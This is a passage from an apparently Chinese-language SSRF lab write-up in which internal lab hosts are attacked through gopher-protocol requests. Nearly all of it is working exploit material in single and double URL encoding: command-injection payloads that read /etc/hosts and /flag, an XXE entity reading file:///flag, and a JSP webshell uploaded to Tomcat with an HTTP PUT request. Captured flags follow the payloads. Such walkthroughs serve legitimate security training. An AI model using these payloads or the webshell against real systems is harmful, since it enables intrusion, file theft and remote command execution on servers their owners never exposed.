25%33%30%25%32%65%25%33%31%25%33%62%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%36%38%25%36%66%25%37%33%25%37%34%25%37%33
```

![image-20240905104106230](https://image.201068.xyz/assets/29.SSRF/image-20240905104106230.png)

```bash
POST / HTTP/1.1
Host: 192.168.70.24:8080
Content-Length: 4830
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.70.24:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.24:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

url=
gopher%3A%2F%2F172.72.23.24%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%37%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%62%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%36%38%25%36%66%25%37%33%25%37%34%25%37%33
```



##### 网页使用1次url编码

在网页只使用1次url编码

```
gopher://172.72.23.24:80/_%50%4f%53%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%37%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%0d%0a%69%70%3d%31%32%37%2e%30%2e%30%2e%31%3b%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73
```

![image-20240905104221190](https://image.201068.xyz/assets/29.SSRF/image-20240905104221190.png)

#### 查看flag

##### 构造payload

```bash
POST / HTTP/1.1
Host: 172.72.23.24
Content-Length: 26
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;cat /flag
```

![image-20240905105757882](https://image.201068.xyz/assets/29.SSRF/image-20240905105757882.png)

##### 网页一次url编码

![image-20240905105937068](https://image.201068.xyz/assets/29.SSRF/image-20240905105937068.png)

```
%50%4f%53%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%32%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%0d%0a%69%70%3d%31%32%37%2e%30%2e%30%2e%31%3b%63%61%74%20%2f%66%6c%61%67
```

###### gopher协议

```bash
gopher://172.72.23.24:80/_%50%4f%53%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%32%32%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%0d%0a%69%70%3d%31%32%37%2e%30%2e%30%2e%31%3b%63%61%74%20%2f%66%6c%61%67
```

![image-20240905110235318](https://image.201068.xyz/assets/29.SSRF/image-20240905110235318.png)

##### burp 二次编码

![image-20240905110534066](https://image.201068.xyz/assets/29.SSRF/image-20240905110534066.png)

```
%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%62%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37
```

###### gopher协议

```bash
gopher%3A%2F%2F172.72.23.24%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%62%25%36%33%25%36%31%25%37%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37
```

![image-20240905110449743](https://image.201068.xyz/assets/29.SSRF/image-20240905110449743.png)



#### flag7

```
flag{nisp7_no_problem_flag7}
```

### 172.72.23.25

![image-20240905110942804](https://image.201068.xyz/assets/29.SSRF/image-20240905110942804.png)

#### 查看网页源代码

![image-20240905140843898](https://image.201068.xyz/assets/29.SSRF/image-20240905140843898.png)

```
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
```

##### 分析源码

```
<user><username>username</username><password>password</password></user>
POST
doLogin.php
contentType: application/xml;charset=utf-8
```

#### XML实体注入

##### payload

```xml
<!DOCTYPE test[<!ENTITY test SYSTEM "file:///flag">]>
<user><username>&test;</username><password>password</password></user>
```

##### burp构造post请求

```xml
POST /doLogin.php HTTP/1.1
Host: 172.72.23.25
Content-Length: 124
Content-Type: application/xml;charset=utf-8

<!DOCTYPE test[<!ENTITY test SYSTEM "file:///flag">]>
<user><username>&test;</username><password>password</password></user>
```

![image-20240905140749816](https://image.201068.xyz/assets/29.SSRF/image-20240905140749816.png)

###### 编码一次

```
%50%4f%53%54%20%2f%64%6f%4c%6f%67%69%6e%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%35%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%63%68%61%72%73%65%74%3d%75%74%66%2d%38%0d%0a%0d%0a%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%5b%3c%21%45%4e%54%49%54%59%20%74%65%73%74%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%0d%0a%3c%75%73%65%72%3e%3c%75%73%65%72%6e%61%6d%65%3e%26%74%65%73%74%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%3c%70%61%73%73%77%6f%72%64%3e%70%61%73%73%77%6f%72%64%3c%2f%70%61%73%73%77%6f%72%64%3e%3c%2f%75%73%65%72%3e
```

![image-20240905141036801](https://image.201068.xyz/assets/29.SSRF/image-20240905141036801.png)

###### 编码二次

```bash
%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%34%25%36%66%25%34%63%25%36%66%25%36%37%25%36%39%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%31%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%36%33%25%36%38%25%36%31%25%37%32%25%37%33%25%36%35%25%37%34%25%33%64%25%37%35%25%37%34%25%36%36%25%32%64%25%33%38%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%32%31%25%34%34%25%34%66%25%34%33%25%35%34%25%35%39%25%35%30%25%34%35%25%32%30%25%37%34%25%36%35%25%37%33%25%37%34%25%35%62%25%33%63%25%32%31%25%34%35%25%34%65%25%35%34%25%34%39%25%35%34%25%35%39%25%32%30%25%37%34%25%36%35%25%37%33%25%37%34%25%32%30%25%35%33%25%35%39%25%35%33%25%35%34%25%34%35%25%34%64%25%32%30%25%32%32%25%36%36%25%36%39%25%36%63%25%36%35%25%33%61%25%32%66%25%32%66%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%32%25%33%65%25%35%64%25%33%65%25%30%64%25%30%61%25%33%63%25%37%35%25%37%33%25%36%35%25%37%32%25%33%65%25%33%63%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%65%25%32%36%25%37%34%25%36%35%25%37%33%25%37%34%25%33%62%25%33%63%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%65%25%33%63%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%65%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%63%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%65%25%33%63%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%33%65
```



#### 使用gopher协议

##### 网页发送gopher

```
gopher://172.72.23.25:80/_%50%4f%53%54%20%2f%64%6f%4c%6f%67%69%6e%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%35%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%32%34%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%63%68%61%72%73%65%74%3d%75%74%66%2d%38%0d%0a%0d%0a%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%5b%3c%21%45%4e%54%49%54%59%20%74%65%73%74%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22%3e%5d%3e%0d%0a%3c%75%73%65%72%3e%3c%75%73%65%72%6e%61%6d%65%3e%26%74%65%73%74%3b%3c%2f%75%73%65%72%6e%61%6d%65%3e%3c%70%61%73%73%77%6f%72%64%3e%70%61%73%73%77%6f%72%64%3c%2f%70%61%73%73%77%6f%72%64%3e%3c%2f%75%73%65%72%3e
```

![image-20240905141108874](https://image.201068.xyz/assets/29.SSRF/image-20240905141108874.png)

##### burp发送gopher

```
gopher%3A%2F%2F172.72.23.25%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%34%25%36%66%25%34%63%25%36%66%25%36%37%25%36%39%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%31%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%36%33%25%36%38%25%36%31%25%37%32%25%37%33%25%36%35%25%37%34%25%33%64%25%37%35%25%37%34%25%36%36%25%32%64%25%33%38%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%32%31%25%34%34%25%34%66%25%34%33%25%35%34%25%35%39%25%35%30%25%34%35%25%32%30%25%37%34%25%36%35%25%37%33%25%37%34%25%35%62%25%33%63%25%32%31%25%34%35%25%34%65%25%35%34%25%34%39%25%35%34%25%35%39%25%32%30%25%37%34%25%36%35%25%37%33%25%37%34%25%32%30%25%35%33%25%35%39%25%35%33%25%35%34%25%34%35%25%34%64%25%32%30%25%32%32%25%36%36%25%36%39%25%36%63%25%36%35%25%33%61%25%32%66%25%32%66%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%32%25%33%65%25%35%64%25%33%65%25%30%64%25%30%61%25%33%63%25%37%35%25%37%33%25%36%35%25%37%32%25%33%65%25%33%63%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%65%25%32%36%25%37%34%25%36%35%25%37%33%25%37%34%25%33%62%25%33%63%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%36%65%25%36%31%25%36%64%25%36%35%25%33%65%25%33%63%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%65%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%63%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%33%65%25%33%63%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%33%65
```

![image-20240905141239915](https://image.201068.xyz/assets/29.SSRF/image-20240905141239915.png)

#### flag8

```
flag{nisp8_another_flag8}
```

### 172.72.23.26:8080

#### tomcat put上传jsp

![image-20240905143626766](https://image.201068.xyz/assets/29.SSRF/image-20240905143626766.png)

#### jsp语言的webshell

```jsp
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

#### 构造PUT请求

![image-20240905144813671](https://image.201068.xyz/assets/29.SSRF/image-20240905144813671.png)

```jsp
PUT /xxx.jsp/ HTTP/1.1
Host: 172.72.23.26:8080
Content-Length: 460

<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

##### url编码

###### 一次url编码

```
%50%55%54%20%2f%78%78%78%2e%6a%73%70%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%36%3a%38%30%38%30%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%34%36%30%0d%0a%0d%0a%3c%25%0d%0a%20%20%20%20%53%74%72%69%6e%67%20%63%6f%6d%6d%61%6e%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%0d%0a%20%20%20%20%69%66%28%63%6f%6d%6d%61%6e%64%20%21%3d%20%6e%75%6c%6c%29%0d%0a%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%3d%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6f%6d%6d%61%6e%64%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%69%6e%74%20%61%20%3d%20%2d%31%3b%0d%0a%20%20%20%20%20%20%20%20%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%77%68%69%6c%65%28%28%61%3d%69%6e%2e%72%65%61%64%28%62%29%29%21%3d%2d%31%29%0d%0a%20%20%20%20%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%62%29%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%0d%0a%20%20%20%20%7d%20%65%6c%73%65%20%7b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%66%6f%72%6d%61%74%3a%20%78%78%78%2e%6a%73%70%3f%63%6d%64%3d%43%6f%6d%6d%61%6e%64%22%29%3b%0d%0a%20%20%20%20%7d%0d%0a%25%3e
```



###### 二次url编码

```
%25%35%30%25%35%35%25%35%34%25%32%30%25%32%66%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%36%25%33%61%25%33%38%25%33%30%25%33%38%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%34%25%33%36%25%33%30%25%30%64%25%30%61%25%30%64%25%30%61%25%33%63%25%32%35%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%30%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%33%64%25%32%30%25%37%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%32%65%25%36%37%25%36%35%25%37%34%25%35%30%25%36%31%25%37%32%25%36%31%25%36%64%25%36%35%25%37%34%25%36%35%25%37%32%25%32%38%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%36%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%30%25%32%31%25%33%64%25%32%30%25%36%65%25%37%35%25%36%63%25%36%63%25%32%39%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%61%25%36%31%25%37%36%25%36%31%25%32%65%25%36%39%25%36%66%25%32%65%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%30%25%36%39%25%36%65%25%33%64%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%65%25%36%37%25%36%35%25%37%34%25%35%32%25%37%35%25%36%65%25%37%34%25%36%39%25%36%64%25%36%35%25%32%38%25%32%39%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%32%38%25%36%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%34%39%25%36%65%25%37%30%25%37%35%25%37%34%25%35%33%25%37%34%25%37%32%25%36%35%25%36%31%25%36%64%25%32%38%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%39%25%36%65%25%37%34%25%32%30%25%36%31%25%32%30%25%33%64%25%32%30%25%32%64%25%33%31%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%35%64%25%32%30%25%36%32%25%32%30%25%33%64%25%32%30%25%36%65%25%36%35%25%37%37%25%32%30%25%36%32%25%37%39%25%37%34%25%36%35%25%35%62%25%33%32%25%33%30%25%33%34%25%33%38%25%35%64%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%37%25%36%38%25%36%39%25%36%63%25%36%35%25%32%38%25%32%38%25%36%31%25%33%64%25%36%39%25%36%65%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%36%32%25%32%39%25%32%39%25%32%31%25%33%64%25%32%64%25%33%31%25%32%39%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%36%63%25%36%65%25%32%38%25%36%65%25%36%35%25%37%37%25%32%30%25%35%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%36%32%25%32%39%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%33%63%25%32%66%25%37%30%25%37%32%25%36%35%25%33%65%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%32%30%25%36%35%25%36%63%25%37%33%25%36%35%25%32%30%25%37%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%32%30%25%36%66%25%37%35%25%37%34%25%32%65%25%37%30%25%37%32%25%36%39%25%36%65%25%37%34%25%32%38%25%32%32%25%36%36%25%36%66%25%37%32%25%36%64%25%36%31%25%37%34%25%33%61%25%32%30%25%37%38%25%37%38%25%37%38%25%32%65%25%36%61%25%37%33%25%37%30%25%33%66%25%36%33%25%36%64%25%36%34%25%33%64%25%34%33%25%36%66%25%36%64%25%36%64%25%36%31%25%36%65%25%36%34%25%32%32%25%32%39%25%33%62%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%37%64%25%30%64%25%30%61%25%32%35%25%33%65
```

![image-20240905145423298](https://image.201068.xyz/assets/29.SSRF/image-20240905145423298.png)

#### gopher协议

##### 网站请求

```
gopher://172.72.23.26:8080/_%50%55%54%20%2f%78%78%78%2e%6a%73%70%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%37%32%2e%37%32%2e%32%33%2e%32%36%3a%38%30%38%30%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%34%36%30%0d%0a%0d%0a%3c%25%0d%0a%20%20%20%20%53%74%72%69%6e%67%20%63%6f%6d%6d%61%6e%64%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%3b%0d%0a%20%20%20%20%69%66%28%63%6f%6d%6d%61%6e%64%20%21%3d%20%6e%75%6c%6c%29%0d%0a%20%20%20%20%7b%0d%0a%20%20%20%20%20%20%20%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%3d%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6f%6d%6d%61%6e%64%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%69%6e%74%20%61%20%3d%20%2d%31%3b%0d%0a%20%20%20%20%20%20%20%20%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%0d%0a%20%20%20%20%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%77%68%69%6c%65%28%28%61%